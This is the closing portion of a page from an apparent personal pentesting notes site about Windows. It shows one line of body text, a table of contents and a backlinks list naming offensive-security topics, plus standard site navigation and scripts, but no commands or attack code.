<p>This works on <a href="../spells/how-to-use-the-windows-firewall-to-relay-ports/../../spellbook/windows" class="internal alias" data-slug="spellbook/windows">Windows</a> 7 and later.</p><a href="../spells/how-to-use-the-windows-firewall-to-relay-ports" class="internal transclude-src">Link to original</a></blockquote><p></p></article><hr/><div class="page-footer"></div></div><div class="right sidebar"><div class="graph"><h3>Graph View</h3><div class="graph-outer"><div id="graph-container" data-cfg="{&quot;drag&quot;:true,&quot;zoom&quot;:true,&quot;depth&quot;:1,&quot;scale&quot;:1.1,&quot;repelForce&quot;:0.5,&quot;centerForce&quot;:0.3,&quot;linkDistance&quot;:30,&quot;fontSize&quot;:0.6,&quot;opacityScale&quot;:1,&quot;showTags&quot;:true,&quot;removeTags&quot;:[],&quot;focusOnHover&quot;:false}"></div><svg version="1.1" id="global-graph-icon" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 55 55" fill="currentColor" xml:space="preserve"><path d="M49,0c-3.309,0-6,2.691-6,6c0,1.035,0.263,2.009,0.726,2.86l-9.829,9.829C32.542,17.634,30.846,17,29,17
	s-3.542,0.634-4.898,1.688l-7.669-7.669C16.785,10.424,17,9.74,17,9c0-2.206-1.794-4-4-4S9,6.794,9,9s1.794,4,4,4
	c0.74,0,1.424-0.215,2.019-0.567l7.669,7.669C21.634,21.458,21,23.154,21,25s0.634,3.542,1.688,4.897L10.024,42.562
	C8.958,41.595,7.549,41,6,41c-3.309,0-6,2.691-6,6s2.691,6,6,6s6-2.691,6-6c0-1.035-0.263-2.009-0.726-2.86l12.829-12.829
	c1.106,0.86,2.44,1.436,3.898,1.619v10.16c-2.833,0.478-5,2.942-5,5.91c0,3.309,2.691,6,6,6s6-2.691,6-6c0-2.967-2.167-5.431-5-5.91
	v-10.16c1.458-0.183,2.792-0.759,3.898-1.619l7.669,7.669C41.215,39.576,41,40.26,41,41c0,2.206,1.794,4,4,4s4-1.794,4-4
	s-1.794-4-4-4c-0.74,0-1.424,0.215-2.019,0.567l-7.669-7.669C36.366,28.542,37,26.846,37,25s-0.634-3.542-1.688-4.897l9.665-9.665
	C46.042,11.405,47.451,12,49,12c3.309,0,6-2.691,6-6S52.309,0,49,0z M11,9c0-1.103,0.897-2,2-2s2,0.897,2,2s-0.897,2-2,2
	S11,10.103,11,9z M6,51c-2.206,0-4-1.794-4-4s1.794-4,4-4s4,1.794,4,4S8.206,51,6,51z M33,49c0,2.206-1.794,4-4,4s-4-1.794-4-4
	s1.794-4,4-4S33,46.794,33,49z M29,31c-3.309,0-6-2.691-6-6s2.691-6,6-6s6,2.691,6,6S32.309,31,29,31z M47,41c0,1.103-0.897,2-2,2
	s-2-0.897-2-2s0.897-2,2-2S47,39.897,47,41z M49,10c-2.206,0-4-1.794-4-4s1.794-4,4-4s4,1.794,4,4S51.206,10,49,10z"></path></svg></div><div id="global-graph-outer"><div id="global-graph-container" data-cfg="{&quot;drag&quot;:true,&quot;zoom&quot;:true,&quot;depth&quot;:-1,&quot;scale&quot;:0.9,&quot;repelForce&quot;:0.5,&quot;centerForce&quot;:0.3,&quot;linkDistance&quot;:30,&quot;fontSize&quot;:0.6,&quot;opacityScale&quot;:1,&quot;showTags&quot;:true,&quot;removeTags&quot;:[],&quot;focusOnHover&quot;:true}"></div></div></div><div class="toc desktop-only"><button type="button" id="toc" class><h3>Table of Contents</h3><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="fold"><polyline points="6 9 12 15 18 9"></polyline></svg></button><div id="toc-content"><ul class="overflow"><li class="depth-0"><a href="#basics" data-for="basics">Basics</a></li><li class="depth-1"><a href="#common-user-types" data-for="common-user-types">Common user types</a></li><li class="depth-1"><a href="#important-local-service-accounts" data-for="important-local-service-accounts">Important local service accounts</a></li><li class="depth-1"><a href="#permissions" data-for="permissions">Permissions</a></li><li class="depth-1"><a href="#paths" data-for="paths">Paths</a></li><li class="depth-1"><a href="#startup" data-for="startup">Startup</a></li><li class="depth-2"><a href="#startup-folder" data-for="startup-folder">Startup folder</a></li><li class="depth-2"><a href="#runrunonce" data-for="runrunonce">Run/RunOnce</a></li><li class="depth-2"><a href="#winlogon" data-for="winlogon">WinLogon</a></li><li class="depth-2"><a href="#logon-scripts" data-for="logon-scripts">Logon scripts</a></li><li class="depth-1"><a href="#services" data-for="services">Services</a></li><li class="depth-1"><a href="#firewall" data-for="firewall">Firewall</a></li><li class="depth-1"><a href="#event-logs" data-for="event-logs">Event logs</a></li><li class="depth-1"><a href="#dlls" data-for="dlls">DLLs</a></li><li class="depth-1"><a href="#ntlm-hashes" data-for="ntlm-hashes">NTLM hashes</a></li><li class="depth-1"><a href="#winrm" data-for="winrm">WinRM</a></li><li class="depth-0"><a href="#reconnaissance" data-for="reconnaissance">Reconnaissance</a></li><li class="depth-1"><a href="#important-commands" data-for="important-commands">Important commands</a></li><li class="depth-1"><a href="#permissions-1" data-for="permissions-1">Permissions</a></li><li class="depth-1"><a href="#querying-the-registry" data-for="querying-the-registry">Querying the registry</a></li><li class="depth-1"><a href="#netstat" data-for="netstat">netstat</a></li><li class="depth-1"><a href="#systeminfo" data-for="systeminfo">systeminfo</a></li><li class="depth-1"><a href="#potentially-interesting-files" data-for="potentially-interesting-files">Potentially interesting files</a></li><li class="depth-2"><a href="#powershell-history" data-for="powershell-history">PowerShell history</a></li><li class="depth-2"><a href="#unattended-windows-installation-data" data-for="unattended-windows-installation-data">Unattended Windows installation data</a></li><li class="depth-2"><a href="#iis-configuration-data" data-for="iis-configuration-data">IIS configuration data</a></li><li class="depth-1"><a href="#wmic" data-for="wmic">wmic</a></li><li class="depth-1"><a href="#powershell" data-for="powershell">PowerShell</a></li><li class="depth-1"><a href="#useful-scripts" data-for="useful-scripts">Useful scripts</a></li><li class="depth-0"><a href="#exploitation" data-for="exploitation">Exploitation</a></li><li class="depth-1"><a href="#permissions-2" data-for="permissions-2">Permissions</a></li><li class="depth-2"><a href="#bulk-editing-permissions" data-for="bulk-editing-permissions">Bulk editing permissions</a></li><li class="depth-2"><a href="#service-acls" data-for="service-acls">Service ACLs</a></li><li class="depth-1"><a href="#dlls-1" data-for="dlls-1">DLLs</a></li><li class="depth-1"><a href="#windows-scripting-host" data-for="windows-scripting-host">Windows scripting host</a></li><li class="depth-1"><a href="#winrm-1" data-for="winrm-1">WinRM</a></li><li class="depth-1"><a href="#services-1" data-for="services-1">Services</a></li><li class="depth-1"><a href="#tasks" data-for="tasks">Tasks</a></li><li class="depth-1"><a href="#shortcut-files" data-for="shortcut-files">Shortcut files</a></li><li class="depth-1"><a href="#file-associations" data-for="file-associations">File associations</a></li><li class="depth-1"><a href="#feature-on-demand-helper" data-for="feature-on-demand-helper">“Feature on demand” helper</a></li><li class="depth-1"><a href="#use-the-windows-firewall-to-relay-ports" data-for="use-the-windows-firewall-to-relay-ports">Use the Windows Firewall to relay ports</a></li></ul></div></div><div class="backlinks"><h3>Backlinks</h3><ul class="overflow"><li><a href="../spellbook/as-rep-roasting" class="internal">AS-REP roasting</a></li><li><a href="../tales/2021-11-04-basic-pentesting" class="internal">Basic pentesting</a></li><li><a href="../tales/2021-12-08-blaster" class="internal">Blaster</a></li><li><a href="../spells/common-meterpreter-commands" class="internal">Common meterpreter commands</a></li><li><a href="../spells/common-nmap-short-flags" class="internal">Common Nmap short flags</a></li><li><a href="../spells/dcerpc" class="internal">DCERPC</a></li><li><a href="../spells/dir" class="internal">dir</a></li><li><a href="../spells/drsuapi" class="internal">DRSUAPI</a></li><li><a href="../spells/equivalent-windows-and-nix-commands" class="internal">Equivalent Windows and *NIX commands</a></li><li><a href="../spells/findstr" class="internal">findstr</a></li><li><a href="../spells/hashcat-password-hash-types" class="internal">Hashcat password hash types</a></li><li><a href="../spells/how-to-add-windows-users-at-the-command-line" class="internal">How to add Windows users at the command line</a></li><li><a href="../spellbook/how-to-disable-amsi" class="internal">How to disable AMSI</a></li><li><a href="../spells/how-to-dump-cleartext-passwords-with-mimikatz" class="internal">How to dump cleartext passwords with Mimikatz</a></li><li><a href="../spells/how-to-exploit-the-windows-feature-on-demand-helper" class="internal">How to exploit the Windows “Feature on Demand” Helper</a></li><li><a href="../spells/how-to-exploit-the-winlogon-initialization-sequence" class="internal">How to exploit the WinLogon initialization sequence</a></li><li><a href="../spellbook/how-to-manipulate-local-windows-services" class="internal">How to manipulate local Windows services</a></li><li><a href="../spellbook/how-to-manipulate-local-windows-tasks" class="internal">How to manipulate local Windows tasks</a></li><li><a href="../spellbook/how-to-manipulate-remote-windows-services" class="internal">How to manipulate remote Windows services</a></li><li><a href="../spells/how-to-manipulate-remote-windows-tasks" class="internal">How to manipulate remote Windows tasks</a></li><li><a href="../spells/how-to-manipulate-users-and-groups-at-the-windows-command-line-using-net" class="internal">How to manipulate users and groups at the Windows command line using net</a></li><li><a href="../spells/how-to-pass-the-ticket-with-mimikatz" class="internal">How to pass the ticket with Mimikatz</a></li><li><a href="../spells/how-to-pop-a-system-shell-on-the-windows-login-screen-using-sticky-keys" class="internal">How to pop a SYSTEM shell on the Windows login screen using sticky keys</a></li><li><a href="../spells/how-to-pop-a-system-shell-on-the-windows-login-screen-using-utilman" class="internal">How to pop a SYSTEM shell on the Windows login screen using Utilman</a></li><li><a href="../spellbook/how-to-use-mimikatz-to-dump-kerberos-tickets" class="internal">How to use Mimikatz to dump Kerberos tickets</a></li><li><a href="../spells/how-to-use-the-windows-firewall-to-relay-ports" class="internal">How to use the Windows Firewall to relay ports</a></li><li><a href="../spellbook/how-to-use-windows-remote-management" class="internal">How to use Windows Remote Management</a></li><li><a href="../spellbook/html-applications" class="internal">HTML applications</a></li><li><a href="../spells/icacls" class="internal">icacls</a></li><li><a href="../tales/2021-12-07-ice" class="internal">Ice</a></li><li><a href="../spells/impacket-psexec-reimplementation" class="internal">Impacket PsExec reimplementation</a></li><li><a href="../spells/ipconfig" class="internal">ipconfig</a></li><li><a href="../spellbook/kerberos" class="internal">Kerberos</a></li><li><a href="../spellbook/kerberos-authentication-process" class="internal">Kerberos authentication process</a></li><li><a href="../spells/kerberos-teminology" class="internal">Kerberos teminology</a></li><li><a href="../spells/mac-addresses" class="internal">mac addresses</a></li><li><a href="../spells/metasploit-exploit-modules" class="internal">Metasploit exploit modules</a></li><li><a href="../spellbook/metasploit-module-usage-basics" class="internal">Metasploit module usage basics</a></li><li><a href="../spellbook/net" class="internal">net</a></li><li><a href="../spells/netsh" class="internal">netsh</a></li><li><a href="../spells/netstat" class="internal">netstat</a></li><li><a href="../spells/nmap-scan-type-flags" class="internal">Nmap scan type flags</a></li><li><a href="../spells/nslookup" class="internal">nslookup</a></li><li><a href="../spellbook/ntlm-hashes" class="internal">NTLM hashes</a></li><li><a href="../spells/ping" class="internal">ping</a></li><li><a href="../spells/reg" class="internal">reg</a></li><li><a href="../spellbook/rubeus" class="internal">Rubeus</a></li><li><a href="../spells/runas" class="internal">runas</a></li><li><a href="../spellbook/" class="internal">Spellbook</a></li><li><a href="../spells/systeminfo" class="internal">systeminfo</a></li><li><a href="../spells/unquoted-path-handling-in-windows" class="internal">Unquoted path handling in Windows</a></li><li><a href="../spells/useful-net-commands" class="internal">Useful net commands</a></li><li><a href="../spellbook/useful-scripts-for-windows-reconnaissance" class="internal">Useful scripts for Windows reconnaissance</a></li><li><a href="../spellbook/visual-basic-for-applications" class="internal">Visual Basic for Applications</a></li><li><a href="../spells/whoami" class="internal">whoami</a></li><li><a href="../spells/windows-dll-search-order" class="internal">Windows DLL search order</a></li><li><a href="../spells/windows-event-ids" class="internal">Windows event IDs</a></li><li><a href="../spellbook/windows-event-logs" class="internal">Windows event logs</a></li><li><a href="../spells/windows-permissions" class="internal">Windows permissions</a></li><li><a href="../spellbook/windows-reconnaissance-with-powershell" class="internal">Windows reconnaissance with PowerShell</a></li><li><a href="../spells/windows-remote-management" class="internal">Windows remote management</a></li><li><a href="../spells/windows-scripting-host" class="internal">Windows Scripting Host</a></li><li><a href="../spells/windows-sebackup-and-serestore-permissions" class="internal">Windows SeBackup and SeRestore permissions</a></li><li><a href="../spells/windows-seimpersonate-and-seassignrimarytoken-permissions" class="internal">Windows SeImpersonate and SeAssignPrimaryToken permissions</a></li><li><a href="../spellbook/windows-services" class="internal">Windows services</a></li><li><a href="../spells/windows-unattended-installation-data" class="internal">Windows unattended installation data</a></li><li><a href="../spells/winrs" class="internal">winrs</a></li><li><a href="../spellbook/wmic" class="internal">wmic</a></li></ul></div></div></div><footer class><p>Created with <a href="https://quartz.jzhao.xyz/">Quartz v4.2.4</a> © 2024</p><ul><li><a href="/">Home</a></li><li><a href="https://github.com/necopinus/resume/raw/main/resume.pdf">Resume</a></li><li><a href="/#contact">Contact</a></li><li><a href="/grimoire/index.xml">RSS Feed</a></li></ul></footer></div></body><script type="application/javascript">function c(){let t=this.parentElement;t.classList.toggle("is-collapsed");let l=t.classList.contains("is-collapsed")?this.scrollHeight:t.scrollHeight;t.style.maxHeight=l+"px";let o=t,e=t.parentElement;for(;e;){if(!e.classList.contains("callout"))return;let n=e.classList.contains("is-collapsed")?e.scrollHeight:e.scrollHeight+o.scrollHeight;e.style.maxHeight=n+"px",o=e,e=e.parentElement}}function i(){let t=document.getElementsByClassName("callout is-collapsible");for(let s of t){let l=s.firstElementChild;if(l){l.addEventListener("click",c),window.addCleanup(()=>l.removeEventListener("click",c));let e=s.classList.contains("is-collapsed")?l.scrollHeight:s.scrollHeight;s.style.maxHeight=e+"px"}}}document.addEventListener("nav",i);window.addEventListener("resize",i);
</script><script type="module">
          let mermaidImport = undefined
          document.addEventListener('nav', async () => {
            if (document.querySelector("code.mermaid")) {
              mermaidImport ||= await import('https://cdnjs.cloudflare.com/ajax/libs/mermaid/10.7.0/mermaid.esm.min.mjs')
              const mermaid = mermaidImport.default
              const darkMode = document.documentElement.getAttribute('saved-theme') === 'dark'
              mermaid.initialize({
                startOnLoad: false,
                securityLevel: 'loose',
                theme: darkMode ? 'dark' : 'default'
              })

              await mermaid.run({
                querySelector: '.mermaid'
              })
            }
          });
          </script><script src="../postscript.js" type="module"></script></html>